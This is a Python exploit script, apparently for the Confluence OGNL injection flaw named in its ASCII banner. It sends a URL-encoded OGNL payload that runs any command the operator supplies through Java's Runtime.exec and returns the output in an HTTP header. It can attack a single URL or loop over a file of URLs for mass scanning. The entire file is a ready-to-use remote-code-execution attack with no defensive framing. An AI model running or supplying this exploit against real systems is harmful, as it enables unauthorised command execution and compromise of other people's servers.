import requests
import argparse

def banner():
    print('''\033[0;35m
   _______      ________    ___   ___ ___  ___      ___   __ __ ____  _  _   
  / ____\ \    / /  ____|  |__ \ / _ \__ \|__ \    |__ \ / //_ |___ \| || |  
 | |     \ \  / /| |__ ______ ) | | | | ) |  ) |_____ ) / /_ | | __) | || |_ 
 | |      \ \/ / |  __|______/ /| | | |/ /  / /______/ / '_ \| ||__ <|__   _|
 | |____   \  /  | |____    / /_| |_| / /_ / /_     / /| (_) | |___) |  | |  
  \_____|   \/   |______|  |____|\___/____|____|   |____\___/|_|____/   |_|  

                       \033[0;35m[\033[0;37mScript coded by Amolo Hunters\033[0;35m]
''')

def exploit_url(url, cmd):
    payload = f'%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{cmd}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Response%22%2C%23a%29%29%7D/'
    if arguments.valid:
        try:
            r = requests.get(f'{url}/{payload}', verify=False, allow_redirects=False, timeout=7)
            if 'X-Response' in r.headers:
                print(f'\033[0;32m[+] \033[0;37mVulnerable: {url} | [{r.headers["X-Response"]}]')
        except:
            pass
    else:
        try:
            r = requests.get(f'{url}/{payload}', verify=False, allow_redirects=False, timeout=7)
            if 'X-Response' in r.headers:
                print(f'\033[0;32m[+] \033[0;37mVulnerable: {url} | [{r.headers["X-Response"]}]')
            else:
                print(f'\033[0;31m[-] \033[0;37mNot vulnerable: {url}')
        except:
            print(f'\033[0;31m[-] \033[0;37mError trying to explore: {url}')
            pass

def exploit_file(f, cmd):
    payload = f'%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{cmd}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Response%22%2C%23a%29%29%7D/'
    if arguments.valid:
        f = open(f, 'r').read().splitlines()
        for url in f:
            try:
                r = requests.get(f'{url}/{payload}', verify=False, allow_redirects=False, timeout=7)
                if 'X-Response' in r.headers:
                    print(f'\033[0;32m[+] \033[0;37mVulnerable: {url} | [{r.headers["X-Response"]}]')
            except:
                pass
    else:
        f = open(f, 'r').read().splitlines()
        for url in f:
            try:
                r = requests.get(f'{url}/{payload}', verify=False, allow_redirects=False, timeout=7)
                if 'X-Response' in r.headers:
                    print(f'\033[0;32m[+] \033[0;37mVulnerable: {url} | [{r.headers["X-Response"]}]')
                else:
                    print(f'\033[0;31m[-] \033[0;37mNot vulnerable: {url}')
            except:
                pass

def main():
    if arguments.url:
        exploit_url(arguments.url, arguments.cmd)
    if arguments.file:
        exploit_file(arguments.file, arguments.cmd)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', action='store', help='target url', dest='url', required=False)
    parser.add_argument('-f','--file', action='store', help='url file', dest='file', required=False)
    parser.add_argument('-cmd', '--command', action='store', help='command', dest='cmd', required=False)
    parser.add_argument('-v', '--valid', action='store_true', help='only valid targets', dest='valid', required=False)
    arguments = parser.parse_args()
    banner()
    main()
